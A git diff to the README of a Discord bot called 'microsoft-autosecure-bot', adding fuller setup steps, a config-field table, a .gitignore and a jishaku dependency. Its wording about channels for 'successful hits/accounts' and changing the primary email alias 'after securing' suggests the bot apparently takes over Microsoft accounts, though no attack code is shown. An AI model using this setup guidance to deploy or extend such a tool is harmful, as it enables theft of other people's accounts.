@@ -119,31 +119,33 @@ Virtual Environment
 ### Step-by-Step Setup
 
 1️⃣ **Clone the Repository**
+
 ```bash
 git clone https://github.com/BaldurJI/microsoft-autosecure-bot.git
 cd microsoft-autosecure-bot
 ```
 
 2️⃣ **Install Dependencies**
+
 ```bash
 pip install -r requirements.txt
 ```
 
 3️⃣ **Create Configuration**
-```bash
-cp config.example.json config.json
-```
 
-4️⃣ **Configure the Bot**
+Create a file named `config.json` in the **same folder** as `main.py` and paste the following content:
+
 ```json
 {
     "tokens": {
-        "bot_token": "YOUR_DISCORD_BOT_TOKEN"
+        "bot_token": "YOUR_DISCORD_BOT_TOKEN_HERE"
     },
-    "owners": [YOUR_DISCORD_USER_ID],
+    "owners": [
+        123456789012345678
+    ],
     "discord": {
-        "accounts_channel": "CHANNEL_ID_FOR_HITS",
-        "log_channel": "CHANNEL_ID_FOR_LOGS"
+        "accounts_channel": 111222333444555666,
+        "log_channel": 777888999000111222
     },
     "autosecure": {
         "replace_main_alias": true
@@ -151,22 +153,73 @@ cp config.example.json config.json
 }
 ```
 
-5️⃣ **Create Database Directory**
+### 📋 Config Fields Explained
+
+| Field | Type | Description | Where to Get |
+|-------|------|-------------|--------------|
+| `tokens.bot_token` | String | Your Discord bot token | [Discord Developer Portal](https://discord.com/developers/applications) → Bot → Reset Token |
+| `owners` | List of Integers | Discord User IDs of bot admins (supports multiple) | Enable Developer Mode → Right-click your name → Copy User ID |
+| `discord.accounts_channel` | Integer | Channel ID for successful hits/accounts | Right-click channel → Copy Channel ID |
+| `discord.log_channel` | Integer | Channel ID for verification logs | Right-click channel → Copy Channel ID |
+| `autosecure.replace_main_alias` | Boolean | Whether to change the primary email alias after securing | `true` or `false` |
+
+### ⚠️ Important Config Notes
+
+- **`owners` must be a list** — even for a single admin, use `[123456789012345678]` (with brackets).
+- **All IDs must be integers** — do NOT put quotes around them (`123456789` is correct, `"123456789"` is wrong).
+- **`config.json` must be in the same folder as `main.py`** — otherwise the bot will fail to start.
+- **Never commit `config.json`** to GitHub — it contains your bot token. Add it to `.gitignore`.
+- **Channel IDs can be set later** using `/set_channel` and `/set_log_channel` commands — set them to `0` initially if you don't have them yet.
+
+### 🛠️ Getting Your IDs
+
+**Discord User ID:**
+1. Open Discord → Settings → Advanced → Enable **Developer Mode**
+2. Right-click your username → **Copy User ID**
+
+**Channel ID:**
+1. Right-click the channel → **Copy Channel ID**
+
+**Bot Token:**
+1. Go to [Discord Developer Portal](https://discord.com/developers/applications)
+2. Select your application → **Bot** → **Reset Token** → Copy
+3. ⚠️ Never share this token with anyone
+
+### 🔒 Create `.gitignore`
+
+Create a `.gitignore` file in the project root to prevent leaking sensitive data:
+
+```
+config.json
+database/
+*.db
+__pycache__/
+*.pyc
+.env
+```
+
+4️⃣ **Create Database Directory**
+
 ```bash
 mkdir database
 ```
 
-6️⃣ **Run the Bot**
+5️⃣ **Run the Bot**
+
 ```bash
 python main.py
 ```
 
 ### requirements.txt
+
 ```
 discord.py>=2.3.0
 httpx>=0.25.0
 python-dateutil>=2.8.2
+jishaku>=2.5.0
 ```
+
+> **Note:** `jishaku` is required because `main.py` loads it as an extension. If you don't want to use it, remove `await self.load_extension("jishaku")` from `main.py`.
 
 ---
 
@@ -207,12 +260,14 @@ graph TD
 ## 🛠️ Architecture
 
 ### Project Structure
+
 ```
 microsoft-autosecure-bot/
 │
 ├── main.py                 # Core bot application
-├── config.json             # Configuration file
+├── config.json             # Configuration file (NOT in git)
 ├── requirements.txt        # Python dependencies
+├── .gitignore              # Git ignore rules
 │
 ├── database/               # SQLite database
 │   └── database.db        # Logs & security emails
@@ -229,6 +284,7 @@ microsoft-autosecure-bot/
 | Database | SQLite3 |
 | Email Service | mail.tm API |
 | Language | Python 3.8+ |
+| Debug/Admin | jishaku |
 
 ---
 
@@ -279,6 +335,7 @@ class DBConnection:
 - 📝 **Monitor logs regularly**
 - 🔄 **Update dependencies frequently**
 - 🚫 **Never share bot tokens**
+- 🚫 **Never commit config.json to GitHub**
 
 ### Legal Disclaimer
 > This bot is designed for educational and research purposes. Use responsibly and only on accounts you have explicit permission to manage. The developer is not responsible for any misuse or violation of Microsoft's Terms of Service.
@@ -305,21 +362,25 @@ class DBConnection:
 ### How to Contribute
 
 1. **Fork the Repository**
+
    ```bash
    git fork https://github.com/BaldurJI/microsoft-autosecure-bot.git
    ```
 
 2. **Create Feature Branch**
+
    ```bash
    git checkout -b feature/amazing-feature
    ```
 
 3. **Commit Changes**
+
    ```bash
    git commit -m "Add amazing feature"
    ```
 
 4. **Push to Branch**
+
    ```bash
    git push origin feature/amazing-feature
    ```
@@ -338,7 +399,7 @@ class DBConnection:
 ## 📊 Stats
 
 [![GitHub stars](https://img.shields.io/github/stars/BaldurJI/microsoft-autosecure-bot)](https://github.com/BaldurJI/microsoft-autosecure-bot/stargazers)
-[![GitHub forks](https://img.shields.io/github/forks/BaldurJI/microsoft-autosecure-bot)](https://github.com/BaldurJI/microsoft-autosecure-bot/network)
+[![GitHub forks](https://img.shields.io/github/forks/BaldurJI/microsoft-autosecure-bot/network)](https://github.com/BaldurJI/microsoft-autosecure-bot/network)
 [![GitHub issues](https://img.shields.io/github/issues/BaldurJI/microsoft-autosecure-bot)](https://github.com/BaldurJI/microsoft-autosecure-bot/issues)
 [![GitHub license](https://img.shields.io/github/license/BaldurJI/microsoft-autosecure-bot)](https://github.com/BaldurJI/microsoft-autosecure-bot/blob/main/LICENSE)
 
